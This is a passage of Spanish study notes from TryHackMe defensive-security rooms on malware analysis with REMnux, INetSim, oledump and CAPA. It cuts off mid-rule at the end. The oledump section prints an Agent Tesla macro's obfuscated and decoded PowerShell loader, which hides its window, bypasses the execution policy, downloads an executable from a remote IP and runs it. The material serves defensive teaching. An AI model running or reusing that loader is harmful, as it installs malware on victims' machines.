    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/3-fake-network-to-aid-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/3. Fake Network to Aid Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "Durante un análisis dinámico es esencial observar el comportamiento del software potencialmente peligroso, especialmente sus actividades de red. Hay varias maneras de hacer esto. Podemos crear una infraestructura entera, un entorno virtual con diferentes máquinas y más. De forma alternativa, hay una herramienta dentro de REMnux VM llamada **INetSim: Internet Services Simulation Suite**.\n\nUsaremos las funcionalidades de INetSim para simular una red real en esta tarea.\n\n--------------------------------\n<h2>Máquinas Virtuales</h2>\nPara esta tarea usaremos 2 máquinas. La primera es nuestra máquina REMnux y la segunda es la AttackBox. Para ejecutar la Attackbox, clickamos en el botón azul **Start AttackBox**. Puedes cambiar de una a otra pinchando en los botones de abajo:\n\n![[Pasted image 20251029183511.png]]\n\n---------------------------------\n<h2>INetSim</h2>\nAntes de empezar debemos configurar la herramienta INetSim dentro de nuestra REMnux. Primero comprueba la IP asignada a tu máquina. Esto se puede ver usando el comando `ipconfig`. Después necesitaremos cambiar la configuración de INetSim corriendo el comando `sudo vu /etc/inetsim/inetsim.conf` y buscando el valor `#dns_default_ip 0.0.0.0`.\n\nElimina el comentario (`#`) y cambia el valor de `0.0.0.0` a la IP de la máquina que has identificado antes. Guarda y sal. Usa el siguiente comando para comprobar los cambios:\n\n`cat /etc/inetsim/inetsim.conf | grep dns_default_ip`\n\n```powershell\nubuntu@10.10.134.94:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip\n# dns_default_ip\n# Syntax: dns_default_ip \ndns_default_ip\t 10.10.134.94\n```\n\nPor último ejecuta la herramienta con:\n\n```powershell\nubuntu@10.10.134.94:~$ sudo inetsim\nINetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg\nUsing log directory:      /var/log/inetsim/\nUsing data directory:     /var/lib/inetsim/\nUsing report directory:   /var/log/inetsim/report/\nUsing configuration file: /etc/inetsim/inetsim.conf\nParsing configuration file.\nWarning: Unknown option '/var/log/inetsim/report/report.104162.txt#start_service' in configuration file '/etc/inetsim/inetsim.conf' line 43\nConfiguration file parsed successfully.\n=== INetSim main process started (PID 4859) ===\nSession ID:     4859\nListening on:   10.10.134.94\nReal Date/Time: 2024-09-22 17:38:22\nFake Date/Time: 2024-09-22 17:38:22 (Delta: 0 seconds)\n Forking services...\n  * dns_53_tcp_udp - started (PID 4863)\n  * http_80_tcp - failed!\n  * https_443_tcp - started (PID 4865)\n  * ftps_990_tcp - started (PID 4871)\n  * pop3_110_tcp - started (PID 4868)\n  * smtp_25_tcp - started (PID 4866)\n  * ftp_21_tcp - started (PID 4870)\n  * pop3s_995_tcp - started (PID 4869)\n  * smtps_465_tcp - started (PID 4867)\n done.\nSimulation running.\n```\n\nDespués de ejecutarlo, asegúrate de que ves la frase \"**Simulation Runnin**\" abajo e ignora el **the http_80_tcp - failed**. ¡Nuestra red falsa ya está corriendo!\n\n----------------------------------\n<h2>AttackBox</h2>\nDesde la máquina de la Attackbox, abrimos el navegador y buscamos la IP de nuestra máquina REMnux usando el comando `https://<ip_REMnux>`. Le damos a Avanzado y aceptamos el riesgo y continuamos.\n\n![[Pasted image 20251029185149.png]]\n\nUna vez hecho deberíamos ser redirigidos a la página base de INetSim.\n\n![[Pasted image 20251029185217.png]]\n\nUn comportamiento usual del malware es descargar otro binario o script. Trataremos de imitar este comportamiento. Podemos hacerlo via CLI o por el navegador aunque usaremos CLI para hacerlo más realista. Usaremos el comando `sudo wget https://<IP_REMnux>/second_payload.zip --no-check-certificate`\n\n```shell\nroot@10.10.134.94:~# sudo wget https://10.10.134.94/second_payload.zip --no-check-certificate\n--2024-09-22 22:18:49--  https://10.10.134.94/second_payload.zip\nConnecting to 10.10.134.94:443... connected.\nWARNING: cannot verify 10.10.134.94's certificate, issued by \\u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\\u2019:\n  Self-signed certificate encountered.\n    WARNING: certificate common name \\u2018inetsim.org\\u2019 doesn't match requested host name \\u2018MACHINE_IP\\u2019.\nHTTP request sent, awaiting response... 200 OK\nLength: 258 [text/html]\nSaving to: \\u2018second_payload.zip\\u2019\n\nsecond_payload.zip  100%[===================>]     258  --.-KB/s    in 0s      \n\n2024-09-22 22:18:49 (14.5 MB/s) - \\u2018second_payload.zip\\u2019 saved [258/258]\n```\n\nTambién podemos tratar de descargarnos otro script, por ejemplo: `sudo wget https://<IP_REMnux>/second_payload.ps1 --no-check-certificate`.\n\nPara verficar los archivos descargados comprobaremos el fichero de descargas, en nuestro caso root:\n\n![[Pasted image 20251029185608.png]]\n\nTodos estos son archivos falsos. Intenta abrir `second_payload.ps1`. Al ser ejecutado, te dirigirá a la página de INetSim.\n\nLo que hicimos aquí fue imitar comportamiento de malware, donde tratamos de descargar un archivo secundario que puede contener malware desde un servidor .\n\n-------------------------------\n<h2>Reporte de Conexión</h2>\nPor último vamos de vuelta a REMnux VM y paramos INetSim. Por defecto, crearemos un reporte de las conexiones capturadas. Esto es normalmente guardado en el directorio `/var/log/inetsim/report/`. Deberíamos de ver algo así:\n\n```text\nReport written to '/var/log/inetsim/report/report.2594.txt' (14 lines)\n=== INetSim main process stopped (PID 2594) ===\n```\n\nPodemos leer el archivo usando `sudo cat /var/log/inetsim/report/report.2594.txt`:\n\n```shell\nubuntu@10.10.134.94:~$ sudo cat /var/log/inetsim/report/report.2594.txt\n=== Report for session '2594' ===\n\nReal start date            : 2024-09-22 21:04:42\nSimulated start date       : 2024-09-22 21:04:42\nTime difference on startup : none\n\n2024-09-22 21:04:53  First simulated date in log file\n2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.10.134.94/, file name: /var/lib/inetsim/http/fakefiles/sample.html\n2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.10.134.94/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe\n2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.10.134.94/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html\n2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.10.134.94/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html\n2024-09-22 21:18:49  Last simulated date in log file\n===\n```\n\nEsto son los logs de cuando la herramienta estaba corriendo. Podemos ver conexiones hechas a una URL, el protocolo y el método usados. También podemos ver el archivo falso que fue descargado."
  },
  {
    "title": "2. File Analysis",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/2-file-analysis/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/2. File Analysis.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "En esta tarea usaremos `oledump.py` para realizar análisis estático de un documento de Excel potencialmente malicioso.\n\n`Oledump.py` es una herramienta que analiizza archivos **OLE2**, comunmente llamado **Structured Storage / Compound File** Binary Fotmat. **OLE** significa **Object Linking and Embedding**, una tecnología de propiedad desarrollada por Microsoft. Los archivos OLE2 son típicamente usados para almacenar múltiples tipos de información, como documentos, hojas de cálculo y presentaciones en un mismo archivo. Esta herramienta es útil para extraer y examinar los contenidos de los archivos OLE2, haciéndola valiosa para análisis forense.\n\nUsando la máquina virtual **REMnux VM** en la tarea, navega hasta el directorio `/home/ubuntu/Desktop/tasks/agenttesla/`. Nuestro archivo objetivo es `agenttesla.xlsm` Ejecuta el comando `oledump.py agenttesla.xlsm`. Verás lo siguiente:\n\n```shell\nubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm \nA: xl/vbaProject.bin\nA1:       468 'PROJECT'\nA2:        62 'PROJECTwm'\nA3: m     169 'VBA/Sheet1'\nA4: M     688 'VBA/ThisWorkbook'\nA5:         7 'VBA/_VBA_PROJECT'\nA6:       209 'VBA/dir'\n```\n\nBasado en el análisis de archivo de OleDump, un script VBA puede estar incrustado en el documento y encontrado dentro de `xl/vbaProject.bin`. Por eso, oledump le dará un índice de A, aunque puede ser diferente a veces. El índice A + Números se llama **data streams**.\n\nAhora deberíamos fijarnos en la data stream con la letra M. Esto significa que hay una **Macro**, y puedes querer comprobar este data stream, `VBA/ThisWorkBook`.\n\nVamos a comprobarlo. Ejecutaremos el comando `oledump.py agenttesla.xlsm -s 4`. Este comando correrá oledump y mirará en los actuales data stream usando el parámetro `-s`, que es la forma corta de `-select`.\n\n```shell\nubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4\n\n00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V\n00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = \"Thi.s\n00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k\"....Ba\n00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-\n00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|\n00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..\n00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl\n00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id\n00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru..\"Expose..\n00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri\n000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..\n000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O\n000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt\n000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s\n000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc\n000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,\n00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^\n00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^\n00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 57  *h..l^*.l* *^-*W\n00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S\n00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.\n00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA\n00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o\n00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 61 73  l^icy..b.*yp^^as\n00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  s *;* $.MFi.lA.=\n00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..\n000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..\n000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.\n000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $\n000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$\n000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..\n000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke\n00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est \n00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i \"\"http.:/\n00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/\n00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf\n00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ....\"\" -.c*.'.4.\n00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s\n00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., \n00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h\"*\"..\".}..^I..e\n00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw(\"WSc\n00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....\n000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..\n```\n\nLos resultados arriba son el dumpeo en formato hexadecimal. Hay una manera más sencilla de leerlo, para ello debemos usar el parámetro `--vbadecompress` además del comando anterior:\n\n```shell\nubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress\n\nAttribute VB_Name = \"ThisWorkbook\"\nAttribute VB_Base = \"0{00020819-0000-0000-C000-000000000046}\"\nAttribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\nAttribute VB_PredeclaredId = True\nAttribute VB_Exposed = False\nAttribute VB_TemplateDerived = False\nAttribute VB_Customizable = True\nPrivate Sub Workbook_Open()\nDim Sqtnew As String, sOutput As String\nDim Mggcbnuad As Object, MggcbnuadExec As Object\nSqtnew = \"^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri \"\"http://193.203.203.67/rt/Doc-3737122pdf.exe\"\" -Out*File $TempFile; St*art-Proce*ss $TempFile;\"\nSqtnew = Replace(Sqtnew, \"*\", \"\")\nSqtnew = Replace(Sqtnew, \"^\", \"\")\nSet Mggcbnuad = CreateObject(\"WScript.Shell\")\nSet MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)\n```\n\n¿Así mucho mejor no? Nuestro mayor interés está en el valor **Sqtnew**:\n\n```shell\nSqtnew = \"^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri \"\"http://193.203.203.67/rt/Doc-3737122pdf.exe\"\" -Out*File $TempFile; St*art-Proce*ss $TempFile;\"\nSqtnew = Replace(Sqtnew, \"*\", \"\")\nSqtnew = Replace(Sqtnew, \"^\", \"\")\n```\n\nCopiaremos la primera parte en CyberChef y seleccionas **Find/Replace** dos veces metiendo cada una de las instrucciones. En nuestro caso la primera es cambiar \"* \" por \"\" y el segundo \"^\" por \"\".\n\n![[Pasted image 20251029175423.png]]\n\nVeamos el output:\n\n```shell\npowershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri \"http://193.203.203.67/rt/Doc-3737122pdf.exe\" -OutFile $TempFile; Start-Process $TempFile;\"\n```\n\n- Correr `-WindowStyle` en PowerShell te permite controlar cómo la ventana de PowerShell aparece al ejecutar un script o comando. En este caso `hidden` (escondido) significa que no será visible para el usuario.\n- Por defecto, PowerShell restringe la ejecución de scripts. El parámetro `-executionPolicy` permite sobreseguir esta política. El `bypass` significa que la restricción se ignora temporalmente.\n- El `Invoke-WebRequest` se usa comúnmente para descargar archivos de internet.\n\t- El parámetro `-Uri` nos deja especificar la URL del recurso web a descargar.\n\t- El parámetro `-OutFile` especifica el archivo local donde el contenido descargado se guardará.\n- El `Start-Process` es ussado para ejecutar el archivo descargado guardado en `$TempFile`.\n\nPara resumirlo, cuando el documento `agenttesla.xlsm` se abre, se dispara una Macro. Esta macro contiene un script VBA. El script se ejecutará sustituyendo los caracteres necesarios en el payload y después lo ejecutará. Este payload ejecuta powershell sin que el usuario pueda ver la interfaz y descarga un archivo de internet y lo ejecuta."
  },
  {
    "title": "0. REMnux - Getting Started",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/3-remnux-getting-started/0-remnux-getting-started/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/0. REMnux - Getting Started.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 3. REMnux - Getting Started",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/3. REMnux - Getting Started/1. Introduction]]\n[[2. File Analysis]]\n[[3. Fake Network to Aid Analysis]]\n[[4. Memory Investigation - Evidence Processing]]\n"
  },
  {
    "title": "5. Dissecting CAPA Results Part 3 - Namespaces",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/5-dissecting-capa-results-part-3-namespaces/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/5. Dissecting CAPA Results Part 3 - Namespaces.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "Dividiremos el tema en dos tópicos: Capacidad y Namespace. En esta tarea veremos el **Namespace**.\n\nDebajo podemos ver el output de `capa.exe`:\n\n```powershell\n┌──────────────────────────────────────────┬────────────────────────────────────┐\n│ Capability                               │ Namespace                          │\n├──────────────────────────────────────────┼────────────────────────────────────┤\n│ reference anti-VM strings                │ anti-analysis/anti-vm/vm-detection │\n│ reference anti-VM strings targeting VMWar│ anti-analysis/anti-vm/vm-detection │\n│ reference anti-VM strings targeting Virtu│ anti-analysis/anti-vm/vm-detection │\n│ contain obfuscated stackstrings          │ anti-analysis/obfuscation/string/  │\n| (2 matches)                              | stackstring                        |\n│ reference HTTP User-Agent string         │ communication/http                 │\n│ check HTTP status code                   │ communication/http/client          │\n│ reference Base64 string                  │ data-manipulation/encoding/base64  │\n│ encode data using XOR                    │ data-manipulation/encoding/xor     │\n│ contain a thread local storage (.tls)    │ executable/pe/section/tls          │\n| section                                  |                                    |\n│ get common file path                     │ host-interaction/file-system       │\n│ create directory                         │ host-interaction/file-system/create│\n│ delete file                              │ host-interaction/file-system/delete│\n│ read file on Windows (4 matches)         │ host-interaction/file-system/read  │\n│ write file on Windows (5 matches)        │ host-interaction/file-system/write │\n│ get thread local storage value           │ host-interaction/process           │\n│ create process on Windows                │ host-interaction/process/create    │\n│ allocate or change RWX memory            │ host-interaction/process/inject    │\n│ reference cryptocurrency strings         │ impact/cryptocurrency              │\n│ link function at runtime on Windows      │ linking/runtime-linking            │\n| (5 matches)                              |                                    |\n│ parse PE header (4 matches)              │ load-code/pe                       │\n│ resolve function by parsing PE exports   | load-code/pe                       │\n| (186 matches)                            |                                    |\n│ run PowerShell expression                │ load-code/powershell/              │\n│ schedule task via at                     │ persistence/scheduled-tasks        │\n│ schedule task via schtasks               │ persistence/scheduled-tasks        │\n└──────────────────────────────────────────┴────────────────────────────────────┘\n```\n\nEl contenido de este bloque se representa en el formato de abajo:\n\n| Formato                                                               | Ejemplo                                                       | Explicación                                                                                                                                               |\n| --------------------------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **Capability(Rule Name)**::**TLN(Top-Level Namespace)**/**Namespace** | reference anti-VM strings::Anti-Analysis/anti-vm/vm-detection | **Reference anti-VM strings** = CAPABILITY (NOMBRE DE REGLA)  <br>**Anti-Analysis** = TLN o Top-Level Namespace  <br>**anti-vm/vm-detection** = NAMESPACE |\n\n----------------------------\n<h2>Namespaces</h2>\nCAPA usa los namespaces para agrupar ítems con el mismo propósito.\n\n| Top-Level Namespace (TLN) | Explicación                                                                                                                                                                                                                        |\n| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| anti-analysis             | Contiene un conjunto de reglas específicamente diseñadas para detectar comportamientos exhibidos por el malware para evitar análisis (ofuscación, empaquetamiento, técnicas anti-depurado, etc.).                                  |\n| collection                | Contiene un conjunto de reglas relacionadas con la información que el malware puede intentar enumerar o recolectar.                                                                                                                |\n| communication             | Contiene un conjunto de reglas que rigen los diferentes comportamientos de comunicación del malware, es decir, cómo interactúa con las redes, C2 y otros comportamientos basados en red.                                           |\n| compiler                  | Contiene un conjunto de reglas y configuraciones para reconocer entornos de build específicos o compiladores usados en la generación de un ejecutable.                                                                             |\n| data-manipulation         | Contiene un set de reglas que gobierna los comportamientos usados en la alteración de información dentro de un archivo ejecutable.                                                                                                 |\n| executable                | Contiene un conjunto de reglas que rigen los atributos de los archivos ejecutables.                                                                                                                                                |\n| host-interaction          | Contiene un conjunto de reglas relacionadas con los comportamientos que incumben interacciones con el sistema host.                                                                                                                |\n| impact                    | Contiene un conjunto de reglas relacionadas a las consecuencias potenciales o efectos del comportamiento de un programa.                                                                                                           |\n| internal                  | Las reglas contenidas en el sistema no se espera que sean usadas directamente por los analistas sino para procesos internos de CAPA con el sistema.                                                                                |\n| lib                       | Bloques de construcción para crear otras reglas.                                                                                                                                                                                   |\n| linking                   | Contiene reglas para identificar comportamientos relacionados al linking o carga dinámica de código o librerías durante la ejecución del programa. El malware suele depender de librerías externas, por eso esto es muy necesario. |\n| load-code                 | Contiene un conjunto de reglas y regulaciones relacionadas a la carga dinámica o ejecución de código durante la ejecución del programa.                                                                                            |\n| malware-family            | Contiene un conjunto de reglas relacionadas a comportamientos ligados a familias de malware particulares.                                                                                                                          |\n| nursery                   | Esto es un terreno de ensayo que contiene reglas para aquellos que no están tan pulidos.                                                                                                                                           |\n| persistence               | Contiene reglas relacionadas a comportamientos asociados con mantener acceso o persistencia en un sistema comprometido                                                                                                             |\n| runtime                   | Contiene un conjunto de reglas que busca identificar la lengua de la plataforma donde corre el programa.                                                                                                                           |\n| targeting                 | Contiene un conjunto de reglas relacionadas a comportamientos exhibidos por programas que interactúan con ATMs.                                                                                                                    |\n\nVeamos cómo funciona esto mirando la tabla de abajo:\n\n| Top-Level Namespace (TLN) | Namespaces           | Rule YAML File                                                                                                  | Explanation                                                                                                                                                                                                                                                                    |\n| ------------------------- | -------------------- | --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| **Anti-Analysis**         | anti-vm/vm-detection | reference-anti-vm-strings-targeting-virtualbox.yml  <br>  <br>reference-anti-vm-strings-targeting-virtualpc.yml | “anti-vm/vm-detection” namespace contiene reglas para detectar entornos de máquina virtual. Detectan strings o patrones usados por malware para detectar VMs mientras corren. Así CAPA puede detectar si el programa está intentando averiguar si está en una máquina virtual. |\n|                           | obfuscation          | obfuscated-with-dotfuscator.yml  <br>  <br>obfuscated-with-smartassembly.yml                                    | El malware suele usar técnicas de ofuscado. Estas incluyen métodos como encriptación de strings, ofuscación del código, empaquetamiento y trucos anti-depuración. El namespace obfuscation lidia con esto para ver el contenido real del código.                               |\n\nPara esto sólo hemos usado **Anti-Analysis** como TLN. Bajo este TLN, hemos agrupado los namespaces como **anti-vm/vm-detection** y **obfuscation**. Cada namespace tiene una colección de reglas dentro de ellos que también se agrupan juntas. Para **anti-vm/vm-detection** tenemos:\n\n- **reference-anti-vm-strings-tartgeting-virtualbox.yml**\n- **reference-anti-vm-strings-tartgeting-virtualpc.yml**\n\nLo mismo para el namespace obfuscation:\n\n- **obfuscated-with-dotfuscator.yml**\n- **obfuscated-with-smartassembly.yml**\n\nRecuerda que esto es bajo el TLN **Anti-Analysis**!\n\n![[Pasted image 20251028131522.png]]\n\nAdemás de lo mencionado en la tabla de arriba, hay más namespaces bajo **Anti-Analysis** con sus correspondientes reglas. Si quieres investigar más consulta este [enlace](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis).\n\nUsa este otro [enlace](https://github.com/MBCProject/capa-rules-1?tab=readme-ov-file#namespace-organization) si estás interesado en otros TLN como collection, compiler, persistence, linking e impact."
  },
  {
    "title": "7. More Information, more fun!",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/7-more-information-more-fun/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/7. More Information, more fun!.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea trataremos de determinar la razón del disparo de las reglas y condiciones involucradas. Usaremos el parámetro `-vv` (very verbose) para conseguir esto.\n\n| Opción                | Descripción          | Sintaxis de Ejemplo           |\n| --------------------- | -------------------- | ----------------------------- |\n| `-v` or `--verbose`   | Habilita verbose     | `capa.exe -v .\\cryptbot.bin`  |\n| `-vv` or `--vverbose` | Habilita muy verbose | `capa.exe -vv .\\cryptbot.bin` |\n\n¡Ejecutémoslo!\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa -vv .\\cryptbot.bin\nloading : 100%|████████████████████| 485/485 [00:00<00:00, 1108.84     rules/s]\n/ analyzing program...\n```\n\nEsto nos dará resultados más detallados, sin embargo, llevará mucho tiempo. Como ya está hecho, miraremos el ejemplo:\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> Get-Content .\\cryptbot_vv.txt\n```\n\nAcceder a esta información desde consola o un editor de texto puede ser abrumador debido a la cantidad de texto en su interior.\n\nPara analizar su contenido con facilidad, necesitamos hacer dos cosas. La primera es usar los parámetros `-j` y `-vv` y redirigir el resultado a un archivo `.json`. El comando quedaría así: `capa.bin -j -vv .\\cryptbot.bin > cryptbot_vv.json`.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa.bin -j -vv .\\cryptbot.bin > cryptbot_vv.json\nloading : 100%|████████████████████| 485/485 [00:00<00:00, 1108.84     rules/s]\n/ analyzing program...\n```\n\nCon esto podemos empezar el siguiente paso.\n\n--------------------------\n<h2>Explorador Web CAPA</h2>\nLo segundo que tenemos que hacer es subir el archivo al **CAPA Web Explorer**. Podemos o usar la versión online en este [enlace](https://mandiant.github.io/capa/explorer/#/) o usar la versión offline en nuestra máquina virtual.\n\nAhora deberíamos ver la página de **Home**.\n\n![[Pasted image 20251028151115.png]]\n\nBuscaremos el botón \"**Upload from local**\" en la esquina inferior izquierda y selecciona el archivo `.json` que hemos preparado. Una vez subido deberías ver un output similar a este:\n\n![[Pasted image 20251028151321.png]]\n\nAhora es momento de explorar esta adición a la herramienta. Revisaremos algunas capabilities y comprobaremos qué parte de las reglas exactamente fue un match.\n\nVeamos el primer ejemplo debajo. Sabemos que la capability fue **reference anti-VM strings targeting VMWare** y que el archivo de configuración de regla correspondiente fue **anti-vm-strings-targeting-vmware.yml**.\n\n![[Pasted image 20251028151705.png]]\n\nVeamos el contenido de la regla:\n\n```PowerShell\nrule:\n  meta:\n    name: reference anti-VM strings targeting VMWare\n    namespace: anti-analysis/anti-vm/vm-detection\n    authors:\n      - michael.hunhoff@mandiant.com\n      - \"@johnk3r\"\n    scopes:\n      static: file\n      dynamic: file\n    att&ck:\n      - Defense Evasion::Virtualization/Sandbox Evasion::System Checks [T1497.001]\n    mbc:\n      - Anti-Behavioral Analysis::Virtual Machine Detection [B0009]\n    references:\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/VMWare.cpp\n    examples:\n      - al-khaser_x86.exe_\n      - b83480162ede09d4aa6d4850f9faa0a4c3834152752fd04cfdb22d647aa1f825:0x17D80\n  features:\n    - or:\n      - string: /VMWare/i\n      - string: /VMTools/i\n      - string: /SOFTWARE\\\\VMware, Inc\\.\\\\VMware Tools/i\n      - string: /VMWare/i\n      - string: /VMTools/i\n      - string: /SOFTWARE\\\\VMware, Inc\\.\\\\VMware Tools/i\n      - string: /vmnet\\.sys/i\n      - string: /vmmouse\\.sys/i\n      - string: /vmusb\\.sys/i\n      - string: /vm3dmp\\.sys/i\n      - string: /vmci\\.sys/i\n      - string: /vmhgfs\\.sys/i\n      - string: 